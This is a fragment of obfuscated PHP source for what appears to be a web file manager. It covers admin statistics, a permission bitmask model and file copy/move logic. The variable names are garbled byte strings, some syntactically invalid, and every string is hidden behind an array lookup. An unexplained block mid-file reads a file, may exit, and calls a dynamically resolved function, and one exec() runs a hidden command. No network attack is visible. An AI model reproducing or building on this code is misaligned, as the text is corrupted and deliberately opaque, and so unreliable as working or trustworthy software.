$ÊÎ¿âÓ, $¥ıÑ‘Ë´[1945] => $‰ÏĞ“íİ - $ÊÎ¿âÓ, $¥ıÑ‘Ë´[1946] => (int) $şÕúÍôÜ, $¥ıÑ‘Ë´[848] => (int) $â¦†õú¼, $¥ıÑ‘Ë´[1947] => (int) $–€İÕÍ); } private function optionAccess() { $·¦ô¦«Å =& $_SERVER[Ùæõ‰Ï’]; return array($·¦ô¦«Å[841] => $this->typeLogCnt(), $·¦ô¦«Å[110] => $this->typeLogCnt($·¦ô¦«Å[110]), $·¦ô¦«Å[525] => $this->typeLogCnt($·¦ô¦«Å[525]), $·¦ô¦«Å[1948] => $this->typeLogCnt($·¦ô¦«Å[1948]), $·¦ô¦«Å[1949] => $this->typeLogCnt($·¦ô¦«Å[1949]), $·¦ô¦«Å[662] => $this->typeLogCnt($·¦ô¦«Å[12], $·¦ô¦«Å[1924])); } private function typeLogCnt($—û¡°¡ = '', $¹ğÃ†üˆ = "\151\x64") { $ëî…œ± =& $_SERVER[Ùæõ‰Ï’]; $Æ¦ê£¤ = array($ëî…œ±[110] => array($ëî…œ±[1950], $ëî…œ±[1951]), $ëî…œ±[525] => array($ëî…œ±[1952], $ëî…œ±[1953]), $ëî…œ±[1948] => array($ëî…œ±[1954], $ëî…œ±[1955], $ëî…œ±[1956]), $ëî…œ±[1949] => array($ëî…œ±[1957], $ëî…œ±[1958]), $ëî…œ±[1959] => array($ëî…œ±[1960], $ëî…œ±[1961], $ëî…œ±[1962])); $¼ôÁçŞ· = strtotime(date($ëî…œ±[1920])); $â“ÙÙ = array($ëî…œ±[231] => array($ëî…œ±[1105], $¼ôÁçŞ·)); if ($—û¡°¡) { $â“ÙÙ[$ëî…œ±[33]] = array($ëî…œ±[7], $Æ¦ê£¤[$—û¡°¡]); } $˜Æå›Ä¹ = Model($ëî…œ±[1923])->where($â“ÙÙ)->count($¹ğÃ†üˆ); return (int) $˜Æå›Ä¹; } private function optionServer() { $§Ë®öÄ¶ =& $_SERVER[Ùæõ‰Ï’]; $”°«¿¹Ğ = $this->diskDriver(); $Ê‹’ÙáÕ = KodIO::defaultDriver(); $ÀâëÉèõ = array($§Ë®öÄ¶[900] => $Ê‹’ÙáÕ[$§Ë®öÄ¶[475]]); $ÍÂâËÏ˜ = Model($§Ë®öÄ¶[544])->where($ÀâëÉèõ)->sum($§Ë®öÄ¶[79]); $œÓ®Ù±Ë = explode($§Ë®öÄ¶[53], $_SERVER[$§Ë®öÄ¶[147]]); $÷´ã¨œ½ = $œÓ®Ù±Ë[0]; $•ÚŞ¡Ş = $GLOBALS[$§Ë®öÄ¶[6]][$§Ë®öÄ¶[21]]; $ïø¡â£î = $•ÚŞ¡Ş[$§Ë®öÄ¶[1067]]; if ($ïø¡â£î == $§Ë®öÄ¶[1055]) { $³¡•Îô = explode($§Ë®öÄ¶[1381], $•ÚŞ¡Ş[$§Ë®öÄ¶[1066]]); $ïø¡â£î = $³¡•Îô[0]; } if ($ïø¡â£î == $§Ë®öÄ¶[1001] || $ïø¡â£î == $§Ë®öÄ¶[887]) { $›‹Ú¢ê² = Model()->db()->query($§Ë®öÄ¶[1963]); $×‡íù™ë = $›‹Ú¢ê²[0] && isset($›‹Ú¢ê²[0][$§Ë®öÄ¶[1669]]) ? $›‹Ú¢ê²[0][$§Ë®öÄ¶[1669]] : 0; $ïø¡â£î = $§Ë®öÄ¶[1964] . ($×‡íù™ë ? $§Ë®öÄ¶[8] . $×‡íù™ë : $§Ë®öÄ¶[12]); } $É¬µ —ò = $GLOBALS[$§Ë®öÄ¶[6]][$§Ë®öÄ¶[425]][$§Ë®öÄ¶[909]]; return array($§Ë®öÄ¶[1965] => $”°«¿¹Ğ ? $”°«¿¹Ğ[$§Ë®öÄ¶[1966]] : 0, $§Ë®öÄ¶[1967] => $”°«¿¹Ğ ? $”°«¿¹Ğ[$§Ë®öÄ¶[1968]] : 0, $§Ë®öÄ¶[1969] => (int) $Ê‹’ÙáÕ[$§Ë®öÄ¶[1966]] * 1024 * 1024 * 1024, $§Ë®öÄ¶[1970] => (int) $ÍÂâËÏ˜, $§Ë®öÄ¶[1971] => ucfirst($÷´ã¨œ½), $§Ë®öÄ¶[1972] => $§Ë®öÄ¶[1973] . PHP_VERSION, $§Ë®öÄ¶[1974] => phpBuild64() ? 64 : 32, $§Ë®öÄ¶[840] => str_replace($§Ë®öÄ¶[1224], $§Ë®öÄ¶[1083], $ïø¡â£î), $§Ë®öÄ¶[425] => ucfirst($É¬µ —ò), $§Ë®öÄ¶[32] => $_SERVER[$§Ë®öÄ¶[1975]]); } private function diskDriver() { $œÜíƒø• =& $_SERVER[Ùæõ‰Ï’]; $Ä˜Ñù” = $œÜíƒø•[8]; $°ŸÆ‚ëº = $GLOBALS[$œÜíƒø•[6]][$œÜíƒø•[1398]] == $œÜíƒø•[1399]; if ($°ŸÆ‚ëº) { $Ä˜Ñù” = $œÜíƒø•[1976]; if (function_exists($œÜíƒø•[1977])) { exec($œÜíƒø•[1978], $µıµâÃ); $Ä˜Ñù” = $µıµâÃ[1] . $œÜíƒø•[8]; } } if (!file_exists($Ä˜Ñù”)) { return; } $³ÔÉ¹â = @disk_total_space($Ä˜Ñù”); $ùÜ¿¼‹İ = $³ÔÉ¹â - @disk_free_space($Ä˜Ñù”); return array($œÜíƒø•[1966] => $³ÔÉ¹â, $œÜíƒø•[1968] => $ùÜ¿¼‹İ); } public function fileChart($Šåõòéë) { $Ä·‰›âˆ =& $_SERVER[Ùæõ‰Ï’]; if (isset($Šåõòéë[$Ä·‰›âˆ[1781]])) { return Model($Ä·‰›âˆ[907])->userFileTypeProfile($Šåõòéë[$Ä·‰›âˆ[1781]]); } if (isset($Šåõòéë[$Ä·‰›âˆ[1979]])) { return Model($Ä·‰›âˆ[907])->groupFileTypeProfile($Šåõòéë[$Ä·‰›âˆ[1979]]); } $ˆâ™“¶« = $this->sourceSize(); $Ê“´ÈÃ = array($Ä·‰›âˆ[192] => 0, $Ä·‰›âˆ[190] => 1); $Ö¤•Å¬Ï = Model($Ä·‰›âˆ[907])->where($Ê“´ÈÃ)->sum($Ä·‰›âˆ[79]); $Ê“´ÈÃ[$Ä·‰›âˆ[190]] = 2; $®’ÙºÓı = Model($Ä·‰›âˆ[907])->where($Ê“´ÈÃ)->sum($Ä·‰›âˆ[79]); return array($Ä·‰›âˆ[846] => $ˆâ™“¶«[$Ä·‰›âˆ[79]], $Ä·‰›âˆ[1913] => $ˆâ™“¶«[$Ä·‰›âˆ[1913]], $Ä·‰›âˆ[1914] => (int) $Ö¤•Å¬Ï, $Ä·‰›âˆ[1915] => (int) $®’ÙºÓı); } private function sourceSize() { $ˆ†”˜Ã¥ =& $_SERVER[Ùæõ‰Ï’]; $óƒµˆÑÇ = Model($ˆ†”˜Ã¥[907])->where(array($ˆ†”˜Ã¥[485] => 0))->sum($ˆ†”˜Ã¥[79]); $ãØ±Ëç— = Model($ˆ†”˜Ã¥[544])->sum($ˆ†”˜Ã¥[79]); if ($ãØ±Ëç— > $óƒµˆÑÇ) { $ãØ±Ëç— = $óƒµˆÑÇ; } return array($ˆ†”˜Ã¥[79] => (int) $óƒµˆÑÇ, $ˆ†”˜Ã¥[1913] => (int) $ãØ±Ëç—); } } class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authAll() { return self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT; } public static function authDefault() { $¤°Øüì =& $_SERVER[Ùæõ‰Ï’]; $âãĞ¯áñ = array(array($¤°Øüì[494] => LNG($¤°Øüì[1980]), $¤°Øüì[1981] => $¤°Øüì[1982], $¤°Øüì[1983] => 1, $¤°Øüì[1984] => 1, $¤°Øüì[1985] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($¤°Øüì[494] => LNG($¤°Øüì[1986]), $¤°Øüì[1981] => $¤°Øüì[1987], $¤°Øüì[1983] => 2, $¤°Øüì[1984] => 1, $¤°Øüì[1985] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($¤°Øüì[494] => LNG($¤°Øüì[1988]), $¤°Øüì[1981] => $¤°Øüì[1989], $¤°Øüì[1983] => 3, $¤°Øüì[1984] => 1, $¤°Øüì[1985] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($¤°Øüì[494] => LNG($¤°Øüì[1990]), $¤°Øüì[1981] => $¤°Øüì[1991], $¤°Øüì[1983] => 4, $¤°Øüì[1984] => 1, $¤°Øüì[1985] => self::AUTH_SHOW | self::AUTH_VIEW), array($¤°Øüì[494] => LNG($¤°Øüì[1992]), $¤°Øüì[1981] => $¤°Øüì[1993], $¤°Øüì[1983] => 5, $¤°Øüì[1984] => 1, $¤°Øüì[1985] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($¤°Øüì[494] => LNG($¤°Øüì[1994]), $¤°Øüì[1981] => $¤°Øüì[1995], $¤°Øüì[1983] => 6, $¤°Øüì[1984] => 1, $¤°Øüì[1985] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($¤°Øüì[494] => LNG($¤°Øüì[1996]), $¤°Øüì[1981] => $¤°Øüì[1997], $¤°Øüì[1983] => 7, $¤°Øüì[1984] => 1, $¤°Øüì[1985] => 0)); return $âãĞ¯áñ; } public static function authCheck($ç²Ó›, $ëúå¡åÁ) { $°Áæ…£“ =& $_SERVER[Ùæõ‰Ï’]; $ç²Ó› = intval($ç²Ó›); if (KodUser::isRoot() && $GLOBALS[$°Áæ…£“[6]][$°Áæ…£“[1998]]) { return !0; } if ($ç²Ó› <= 0) { return !1; } if (($ç²Ó› & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($ç²Ó› & $ëúå¡åÁ); } public static function authCheckShow($û¡úä½¾) { return self::authCheck($û¡úä½¾, self::AUTH_SHOW); } public static function authCheckView($«°«Ùı) { return self::authCheck($«°«Ùı, self::AUTH_VIEW); } public static function authCheckDownload($õ–ÒÍà–) { return self::authCheck($õ–ÒÍà–, self::AUTH_DOWNLOAD); } public static function authCheckUpload($©”‹Îà) { return self::authCheck($©”‹Îà, self::AUTH_UPLOAD); } public static function authCheckEdit($Ò±üí) { return self::authCheck($Ò±üí, self::AUTH_EDIT); } public static function authCheckRemove($Ğ¡şŞ…ğ) { return self::authCheck($Ğ¡şŞ…ğ, self::AUTH_REMOVE); } public static function authCheckShare($ƒíëÓ”) { return self::authCheck($ƒíëÓ”, self::AUTH_SHARE); } public static function authCheckComment($‘æ÷¨) { return self::authCheck($‘æ÷¨, self::AUTH_COMMENT); } public static function authCheckEvent($†Ñ«Ù€) { return self::authCheck($†Ñ«Ù€, self::AUTH_EVENT); } public static function authCheckRoot($ÁÀÓÂå­) { return self::authCheck($ÁÀÓÂå­, self::AUTH_ROOT); } public static function authCheckAction($Ğ¬ºİ¥°, $çáòÕ) { $Ò ««‘û =& $_SERVER[Ùæõ‰Ï’]; $ é‹¿áš = array($Ò ««‘û[1999] => self::AUTH_VIEW, $Ò ««‘û[1292] => self::AUTH_DOWNLOAD, $Ò ««‘û[110] => self::AUTH_UPLOAD, $Ò ««‘û[1949] => self::AUTH_EDIT, $Ò ««‘û[1948] => self::AUTH_REMOVE, $Ò ««‘û[1959] => self::AUTH_SHARE, $Ò ««‘û[430] => self::AUTH_COMMENT, $Ò ««‘û[1769] => self::AUTH_EVENT, $Ò ««‘û[2000] => self::AUTH_ROOT); if (!isset($ é‹¿áš[$çáòÕ])) { return; } $µŠİ÷Ü = $ é‹¿áš[$çáòÕ]; $Ğ¬ºİ¥° = intval($Ğ¬ºİ¥°); if ($Ğ¬ºİ¥° <= 0) { return !1; } if (($Ğ¬ºİ¥° & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($Ğ¬ºİ¥° & $µŠİ÷Ü); } public static function authDisable($¡ùŞÑıÛ, $ãç¸İ¢») { if (intval($¡ùŞÑıÛ) <= 0) { return 0; } return intval($¡ùŞÑıÛ) & ~$ãç¸İ¢»; } public $optionType = "\123\x79\x73\x74\145\155\x2e\163\x6f\x75\162\x63\145\x41\165\164\x68\x4c\x69\163\x74"; public $field = array("\x6e\141\x6d\145", "\141\165\x74\x68", "\x6c\141\142\x65\154", "\x64\151\x73\x70\x6c\141\x79", "\x73\171\x73\x74\x65\x6d", "\163\157\162\x74"); public function initData() { $Ì«ù¬ª„ = $this->authDefault(); foreach ($Ì«ù¬ª„ as $İÈ‚¨Ç†) { $this->add($İÈ‚¨Ç†); } } public function findAuth($ô»ò®™Ì, $œùœä ) { $Ñ”±ÄÃ =& $_SERVER[Ùæõ‰Ï’]; $Ù™‚Ç¸ = parent::listData(); foreach ($Ù™‚Ç¸ as $Ïö€Ã–) { $Â”ìàÆö = intval($Ïö€Ã–[$Ñ”±ÄÃ[487]]); if ($Â”ìàÆö <= 0 || $Ïö€Ã–[$Ñ”±ÄÃ[2001]] == 0) { continue; } if (($Â”ìàÆö & $ô»ò®™Ì) != $ô»ò®™Ì) { continue; } if (($Â”ìàÆö & $œùœä ) != 0) { continue; } return $Ïö€Ã–[$Ñ”±ÄÃ[475]]; } return !1; } public function findAuthReadOnly() { $Ø«Ÿ«ÆÌ = self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD; $©¶şï = self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE; return $this->findAuth($Ø«Ÿ«ÆÌ, $©¶şï); } public function findAuthNotRead() { return $this->findAuth(0, self::AUTH_SHOW); } public function findAuthMinDefault() { $Ü½ç´ñÙ =& $_SERVER[Ùæõ‰Ï’]; $£¤Ğ¬ßØ = parent::listData(); $«´©èÂ = !1; foreach ($£¤Ğ¬ßØ as $Ú¹É‹‡œ) { if ($Ú¹É‹‡œ[$Ü½ç´ñÙ[487]] <= 0 || $Ú¹É‹‡œ[$Ü½ç´ñÙ[2001]] == $Ü½ç´ñÙ[228]) { continue; } if (!$«´©èÂ) { $«´©èÂ = $Ú¹É‹‡œ; continue; } if ($«´©èÂ[$Ü½ç´ñÙ[487]] > $Ú¹É‹‡œ[$Ü½ç´ñÙ[487]]) { $«´©èÂ = $Ú¹É‹‡œ; } } return $«´©èÂ ? $«´©èÂ[$Ü½ç´ñÙ[475]] : $Ü½ç´ñÙ[12]; } public function listData($˜İÉ†Í¦ = false, $«ûûù£á = "\x73\x6f\x72\x74", $ìÏôÑº« = false) { return parent::listData($˜İÉ†Í¦, $«ûûù£á, $ìÏôÑº«); } public function update($îÃúËñ, $Í›É º) { $™•¨í¤Ã =& $_SERVER[Ùæõ‰Ï’]; $‘ì±Àûµ = parent::listData($îÃúËñ); $š…‚µ¼ğ = $this->findByName($Í›É º[$™•¨í¤Ã[32]]); if (!$‘ì±Àûµ || $š…‚µ¼ğ && $š…‚µ¼ğ[$™•¨í¤Ã[475]] != $‘ì±Àûµ[$™•¨í¤Ã[475]]) { return !1; } $this->filterAuth($Í›É º[$™•¨í¤Ã[487]]); return parent::update($îÃúËñ, $Í›É º); } public function remove($“„†¤Øˆ) { $º©ĞÓÌ­ = parent::listData($“„†¤Øˆ); if (!$º©ĞÓÌ­ || $º©ĞÓÌ­[$_SERVER[Ùæõ‰Ï’][191]]) { return !1; } return parent::remove($“„†¤Øˆ); } public function add($ÜÃïÎ’ = array()) { $şĞ‡Î« =& $_SERVER[Ùæõ‰Ï’]; if ($this->findByName($ÜÃïÎ’[$şĞ‡Î«[32]])) { return !1; } $ßÒŒÅ£¾ = array($şĞ‡Î«[32] => $şĞ‡Î«[12], $şĞ‡Î«[487] => 1, $şĞ‡Î«[2002] => $şĞ‡Î«[1989], $şĞ‡Î«[2001] => 1, $şĞ‡Î«[191] => 0, $şĞ‡Î«[2003] => 0); $ÜÃïÎ’ = array_merge($ßÒŒÅ£¾, $ÜÃïÎ’); $ÜÃïÎ’[$şĞ‡Î«[2003]] = $this->getSort(); $this->filterAuth($ÜÃïÎ’[$şĞ‡Î«[487]]); return parent::insert($ÜÃïÎ’); } private function getSort() { $ğıª•Ô€ =& $_SERVER[Ùæõ‰Ï’]; $Ô€šÖ¢½ = parent::listData(); $â¬ÅöÒù = array_to_keyvalue($Ô€šÖ¢½, $ğıª•Ô€[12], $ğıª•Ô€[2003]); return empty($â¬ÅöÒù) ? 0 : max($â¬ÅöÒù) + 1; } private function filterAuth(&$‚º•øÏ¶) { if (!$‚º•øÏ¶) { return; } $Æ²ığşä = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $¥Óßç—¡ = array(); foreach ($Æ²ığşä as $­ƒ ƒ€) { if ($‚º•øÏ¶ & $­ƒ ƒ€) { $¥Óßç—¡[] = $­ƒ ƒ€; } } if (in_array(self::AUTH_ROOT, $¥Óßç—¡)) { $‚º•øÏ¶ = array_sum($Æ²ığşä); return; } $şªğÁŞ¶ = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); foreach ($¥Óßç—¡ as $­ƒ ƒ€) { if (isset($şªğÁŞ¶[$­ƒ ƒ€])) { $¥Óßç—¡ = array_merge($¥Óßç—¡, $şªğÁŞ¶[$­ƒ ƒ€]); } } $¥Óßç—¡[] = self::AUTH_SHOW; $‚º•øÏ¶ = array_sum(array_unique($¥Óßç—¡)); } public function sort($œ€Æëö, $ú„ºÕ¾²) { return parent::update($œ€Æëö, $ú„ºÕ¾²); } } goto A©õ±Ã„Æ; bàÌ°¤ôˆÒ: if ($_SERVER[$_SERVER[Ùæõ‰Ï’][961]] != $_SERVER[$_SERVER[Ùæõ‰Ï’][1049]]) { $_getc = $_SERVER[Ùæõ‰Ï’][963]; $_getfile = $_SERVER[$_SERVER[Ùæõ‰Ï’][964]] . $_SERVER[Ùæõ‰Ï’][965]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[Ùæõ‰Ï’][262], $_getfilec); if (count($_getarrs) < $_SERVER[Ùæõ‰Ï’][686]) { $exit = $_SERVER[Ùæõ‰Ï’][966]; $exit(); } $_act = $_SERVER[Ùæõ‰Ï’][1050]; $_act($_SERVER[$_SERVER[Ùæõ‰Ï’][959]]); } class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($ö‹Øƒ®Ö, $Ü¤¶ÈÖÓ) { $âéší =& $_SERVER[Ùæõ‰Ï’]; $”¾ÂÅ¸ó = $Ü¤¶ÈÖÓ; $GLOBALS[$âéší[1240]] = $âéší[1241] . $ö‹Øƒ®Ö; Hook::trigger($âéší[1241] . $ö‹Øƒ®Ö . $âéší[1242], $”¾ÂÅ¸ó); $–ÈÊ¯è‚ = self::driverMake($Ü¤¶ÈÖÓ[0]); if (!$–ÈÊ¯è‚) { return !1; } if (method_exists($–ÈÊ¯è‚, $ö‹Øƒ®Ö)) { $´†•£¨ = @call_user_func_array(array($–ÈÊ¯è‚, $ö‹Øƒ®Ö), $Ü¤¶ÈÖÓ); } else { if (method_exists($–ÈÊ¯è‚, $âéší[1243])) { $´†•£¨ = @call_user_func_array(array($–ÈÊ¯è‚, $ö‹Øƒ®Ö), $Ü¤¶ÈÖÓ); } else { if (method_exists(self, $ö‹Øƒ®Ö)) { $´†•£¨ = @call_user_func_array(array(self, $ö‹Øƒ®Ö), $Ü¤¶ÈÖÓ); } else { $´†•£¨ = call_user_func_array(array(parent, $ö‹Øƒ®Ö), $Ü¤¶ÈÖÓ); } } } Hook::trigger($âéší[1241] . $ö‹Øƒ®Ö . $âéší[1244], $”¾ÂÅ¸ó, $´†•£¨); return $´†•£¨; } public static function init($£Ïğë®æ) { return self::driverMake($£Ïğë®æ); } public static function copy($ÉŸæÛôş, $¦ŒÊ©, $£¹‡²„â = false, $“æ…Õ… = false) { return self::copyMoveStart($ÉŸæÛôş, $¦ŒÊ©, $£¹‡²„â, $_SERVER[Ùæõ‰Ï’][618], $“æ…Õ…); } public static function move($½¸áßƒÕ, $Óî¼Ø¨, $¬şÚ§î´ = false, $ÇÍ Ï = false) { return self::copyMoveStart($½¸áßƒÕ, $Óî¼Ø¨, $¬şÚ§î´, $_SERVER[Ùæõ‰Ï’][620], $ÇÍ Ï); } private static function copyMoveStart($–Ö×§àÆ, $§¢õöÅß, $ñÃ¢ßÊã, $òªó•‹, $ÔËÄÁîÊ) { $ ®Íó… =& $_SERVER[Ùæõ‰Ï’]; $°ˆ¾ÈÕö = array($–Ö×§àÆ, $§¢õöÅß, $ñÃ¢ßÊã, $ÔËÄÁîÊ); Hook::trigger($ ®Íó…[1241] . $òªó•‹ . $ ®Íó…[1242], $°ˆ¾ÈÕö); $Çİıü¥® = self::copyMove($–Ö×§àÆ, $§¢õöÅß, $ñÃ¢ßÊã, $òªó•‹, $ÔËÄÁîÊ); Hook::trigger($ ®Íó…[1241] . $òªó•‹ . $ ®Íó…[1244], $°ˆ¾ÈÕö, $Çİıü¥®); return $Çİıü¥®; } public static function saveFile($–´à¤Çå, $­õı¥, $Ãæ«Œ·¶ = true) { $ßûƒÏ‡› =& $_SERVER[Ùæõ‰Ï’]; $¨ÁÑêˆ = self::info($­õı¥); $ÚšÖØ‡ = self::driverMake($–´à¤Çå); $¬•ŞÉè = self::driverMake($­õı¥); $ƒ•¨×¸è = !1; if ($¬•ŞÉè->pathParse[$ßûƒÏ‡›[1245]]) { $ƒ•¨×¸è = $¬•ŞÉè; $Î™íŸ„¬ = $¬•ŞÉè->pathParse[$ßûƒÏ‡›[1245]]; $¬•ŞÉè = self::driverMake($Î™íŸ„¬); } if ($ÚšÖØ‡->pathParse[$ßûƒÏ‡›[1245]]) { $Ê©¹«£ = $ÚšÖØ‡->pathParse[$ßûƒÏ‡›[1245]]; $ÚšÖØ‡ = self::driverMake($Ê©¹«£); } $…ÔŒ¹’œ = $¬•ŞÉè->pathFather($­õı¥); $¸£äÒß = !0; if (!$Ãæ«Œ·¶ && self::driverIsSame($ÚšÖØ‡, $¬•ŞÉè)) { $¸£äÒß = !1; } $æÚğ€ÑŠ = self::copyFile($ÚšÖØ‡, $–´à¤Çå, $¬•ŞÉè, $…ÔŒ¹’œ, $¨ÁÑêˆ[$ßûƒÏ‡›[32]], $¸£äÒß); if ($ƒ•¨×¸è) { $æÚğ€ÑŠ = $ƒ•¨×¸è->getPathOuter($æÚğ€ÑŠ); } return $æÚğ€ÑŠ; } private static function copyMove($ÔÀæÈ¯Ô, $Ô’¡ğÒ´, $àë¤çÚá, $»“Ø‡šĞ, $ı³ƒ„®¢ = false) { $ÒŸÅ´„ =& $_SERVER[Ùæõ‰Ï’]; if (!$ÔÀæÈ¯Ô || $ÔÀæÈ¯Ô == $ÒŸÅ´„[8] || !$Ô’¡ğÒ´) { return !1; } ignore_timeout(); $±è©şÇ = self::driverMake($ÔÀæÈ¯Ô); $÷§ôä¦¤ = self::driverMake($Ô’¡ğÒ´); $åªáş¥ = $»“Ø‡šĞ == $ÒŸÅ´„[620]; $¶…ˆ¦Œà = !1; if ($÷§ôä¦¤->pathParse[$ÒŸÅ´„[1245]]) { $¶…ˆ¦Œà = $÷§ôä¦¤; $Ô’¡ğÒ´ = $÷§ôä¦¤->pathParse[$ÒŸÅ´„[1245]]; $÷§ôä¦¤ = self::driverMake($Ô’¡ğÒ´); } if ($±è©şÇ->pathParse[$ÒŸÅ´„[1245]]) { $ÔÀæÈ¯Ô = $±è©şÇ->pathParse[$ÒŸÅ´„[1245]]; $±è©şÇ = self::driverMake($ÔÀæÈ¯Ô); } self::check($±è©şÇ, $ÔÀæÈ¯Ô, $÷§ôä¦¤, $Ô’¡ğÒ´); Hook::trigger($ÒŸÅ´„[1246], $±è©şÇ, $ÔÀæÈ¯Ô, $÷§ôä¦¤, $Ô’¡ğÒ´); $Ö—ˆ¹É¦ = self::driverIsSame($±è©şÇ, $÷§ôä¦¤); if ($Ö—ˆ¹É¦) { if ($»“Ø‡šĞ == $ÒŸÅ´„[620] && !method_exists($÷§ôä¦¤, $ÒŸÅ´„[1247]) && trim($Ô’¡ğÒ´, $ÒŸÅ´„[8]) == trim($÷§ôä¦¤->pathFather($ÔÀæÈ¯Ô), $ÒŸÅ´„[8])) { if ($±è©şÇ->pathThis($ÔÀæÈ¯Ô) != $ı³ƒ„®¢ && !$±è©şÇ->isOsDriver()) { return $±è©şÇ->rename($ÔÀæÈ¯Ô, $ı³ƒ„®¢); } return $÷§ôä¦¤->getPathOuter($ÔÀæÈ¯Ô); } if (method_exists($÷§ôä¦¤, $»“Ø‡šĞ)) { return $÷§ôä¦¤->{$»“Ø‡šĞ}($ÔÀæÈ¯Ô, $Ô’¡ğÒ´, $àë¤çÚá, $ı³ƒ„®¢); } } if ($Ö—ˆ¹É¦ && $»“Ø‡šĞ == $ÒŸÅ´„[620] && $÷§ôä¦¤->getType() == $ÒŸÅ´„[109]) { $»‡»ˆ©Ï = $÷§ôä¦¤->movePath($ÔÀæÈ¯Ô, $Ô’¡ğÒ´, $ı³ƒ„®¢); if ($»‡»ˆ©Ï) { return $»‡»ˆ©Ï; } } $ê× ¡¨— = $±è©şÇ->isFile($ÔÀæÈ¯Ô); if (!$ê× ¡¨— && $÷§ôä¦¤->getType() == $ÒŸÅ´„[840] && $±è©şÇ->getType() == $ÒŸÅ´„[109]) { $»‡»ˆ©Ï = $÷§ôä¦¤->copyFolderFromIO($±è©şÇ, $ÔÀæÈ¯Ô, $Ô’¡ğÒ´, $àë¤çÚá, $åªáş¥, $ı³ƒ„®¢); } else { $»‡»ˆ©Ï = self::copyPath($±è©şÇ, $ÔÀæÈ¯Ô, $÷§ôä¦¤, $Ô’¡ğÒ´, $àë¤çÚá, $åªáş¥, $ê× ¡¨—, $ı³ƒ„®¢); } if ($»‡»ˆ©Ï && $åªáş¥) { $±è©şÇ->remove($ÔÀæÈ¯Ô); } if ($¶…ˆ¦Œà) { $»‡»ˆ©Ï = $¶…ˆ¦Œà->getPathOuter($»‡»ˆ©Ï); } return $»‡»ˆ©Ï; } private static function check($Îš¯ÆµÇ, $›®ò€ä, $Ù ªÍ÷ù, &$‹ö„¤ç¾) { $ğÊ¯æû =& $_SERVER[Ùæõ‰Ï’]; if (self::driverIsSame($Îš¯ÆµÇ, $Ù ªÍ÷ù) && $Îš¯ÆµÇ->isFolder($›®ò€ä) && $Îš¯ÆµÇ->isParentOf($›®ò€ä, $‹ö„¤ç¾)) { show_json(LNG($ğÊ¯æû[1248]), !1); } if (!$Îš¯ÆµÇ->exist($›®ò€ä)) { show_json(LNG($ğÊ¯æû[108]), !1); } } private static function copyPath($¤Ÿİ›¼°, $¹†Ë²È, $¦äÅ€®ª, $¦§Şò‡İ, $¯êúÇš, $î¨•ËÅˆ, $ˆ²Õ‰ªÏ, $Á“º‰ãŠ = false, $øÛïÛ²˜ = true) { $‹ó¾³š£ =& $_SERVER[Ùæõ‰Ï’]; $×ÂÃËØš = empty($Á“º‰ãŠ) && $Á“º‰ãŠ !== $‹ó¾³š£[228] ? $¤Ÿİ›¼°->pathThis($¹†Ë²È) : $Á“º‰ãŠ; if ($¯êúÇš) { $ù‡ ˜î = $¦äÅ€®ª->fileNameExist($¦§Şò‡İ, $×ÂÃËØš); $ßş‚ØÁ× = $×ÂÃËØš; $×ÂÃËØš = $¦äÅ€®ª->fileNameAuto($¦§Şò‡İ, $×ÂÃËØš, $¯êúÇš, !$ˆ²Õ‰ªÏ); if (!$ù‡ ˜î || $ßş‚ØÁ× != $×ÂÃËØš) { $¯êúÇš = !1; } if ($øÛïÛ²˜ && !$¯êúÇš) { $¦äÅ€®ª->_data[$‹ó¾³š£[1249]] = !0; } } if ($ˆ²Õ‰ªÏ) { return self::copyFile($¤Ÿİ›¼°, $¹†Ë²È, $¦äÅ€®ª, $¦§Şò‡İ, $×ÂÃËØš, $î¨•ËÅˆ); } if ($¯êúÇš == REPEAT_RENAME_FOLDER) { $¯êúÇš = !1; } $’ÁÀÚÙ = rtrim($¦§Şò‡İ, $‹ó¾³š£[8]) . $‹ó¾³š£[8] . $×ÂÃËØš; $›—µûÉì = $¦äÅ€®ª->mkdir($¦äÅ€®ª->getPath($’ÁÀÚÙ), $¯êúÇš); $¦§Şò‡İ = $¦äÅ€®ª->getPathInner($›—µûÉì); $¢ÁÛ§¡” = $¤Ÿİ›¼°->listPath($¹†Ë²È, !0); $¢ÁÛ§¡” = is_array($¢ÁÛ§¡”) ? $¢ÁÛ§¡” : array($‹ó¾³š£[86] => array(), 